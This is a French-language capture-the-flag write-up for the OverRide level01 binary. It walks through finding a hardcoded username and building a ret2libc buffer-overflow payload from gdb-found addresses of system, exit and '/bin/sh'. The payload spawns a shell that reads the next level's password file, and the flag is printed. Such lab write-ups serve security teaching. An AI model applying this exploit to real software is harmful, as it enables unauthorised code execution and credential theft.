#### Etape 1 : Décompilation 

```bash
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: fsdfsdfsd
verifying username....

nope, incorrect username...

level01@OverRide:~$ ./level01 dssd sdsd
********* ADMIN LOGIN PROMPT *********
Enter Username: ds
verifying username....

nope, incorrect username...
```

Ce binaire ne prend aucun argument et demande un username.
Dans ce binaire il y a 3 fonctions : main(), verify_user_name() et verify_user_pass().
La fonction verify_user_name() vérifie si le username est égale a "dat_wil".
La fonction verify_user_pass() vérifie si le password est égale a "admin".
```bash
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...
```


#### Etape 2 : Probleme

Le premier fgets recupere le username et apres on compare avec "dat_wil".
Le deuxieme fgets recupere le password et apres on compare avec "admin".
Mais qu'il soit correct ou non on a un message d'erreur.
```c
    if ((local_14 == 0) || (local_14 != 0)) {
      puts("nope, incorrect password...\n");
      uVar1 = 1;
    }
```
#### Etape 3 : Idée

L'idée est d'envoyer un shell dans le password pour qu'il s'éxécute.
Après avoir tenter d'ajouter un shellcode sans succès nous avons tentés de reproduire un ret2libc.
Celui ci nécessite d'appeler le pointeur de la fonction system, d'y ajouter ensuite un pointeur vers une fonction, c'est necessaire pour spécifier dans quel fonction retourner après l'appel a system. Pour finir ajouter une adresse qui correspond a la chaine de caractères que l'on souhaite éxécuter.

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find __libc_start_main,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb)
````
system : 0xf7e6aed0
exit : 0xf7e5eb70
/bin/sh : 0xf7f897ec

#### Etape 4 : Execution 

```bash
level01@OverRide:~$ python -c 'print "A" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"+ "B"*20' > /tmp/hugo
level01@OverRide:~$ echo "dat_wil" > /tmp/test
level01@OverRide:~$ cat /tmp/test
dat_wil
level01@OverRide:~$ (cat /tmp/test ; cat /tmp/hugo -) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

```
